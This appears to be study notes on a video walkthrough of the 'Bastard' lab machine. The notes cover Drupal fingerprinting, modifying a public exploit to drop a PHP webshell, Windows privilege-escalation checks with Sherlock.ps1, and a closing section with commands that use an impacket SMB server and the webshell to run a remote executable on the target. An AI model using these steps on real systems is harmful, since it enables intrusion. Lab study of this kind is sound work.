# Bastard
## the guy reads a lot of books & blogs
## checking github commits to see if software if updated or not
## changelog.txt to fingerprint drupal and droopescan --> the guy has knowledge of the CMS + the tool to use
## google search for exploit
## searchsploit and checking blogpost to link with google search findings

## exploit modification to include code execution and file upload to his webshell --> this guy knows php and spent some time figuring this out --> figuring out an exploit is no easy work!

## intercepting with burp and seeing requests

## url modification for exploit to work

## running powershell code from cmd
`echo iex("get-date") | powershell -nop -`

## Sherlock.ps1 Encoding problems
Sherlock.ps1 had encoding problems --> ippsec used dos2unix Sherlock.ps1 to fix it

searches for privesc on google using MS-XX reference + Proof of Concept

## Real pentest advice on using public exploite
in a real pentest, we examine public exploit code to make sure there are no backdoors ...etc.

guy could tell that the sherlock test was bullshit

he also knew the vulnerability of secondary logon needed multiple processors and couldnt' be done

*the guy knows the exploits well*

## check files for windows updates
`c:\windows\update.log`

## Executing code off SMB server
1. set up smb server from impacket
`impacket-smbserver <SHARENAME> $(pwd)`
2. execute from the webshell
`<RHOST>/shell.php?fexec=\\<LHOST>\<SHARENAME>\<EXE> <ARGS>`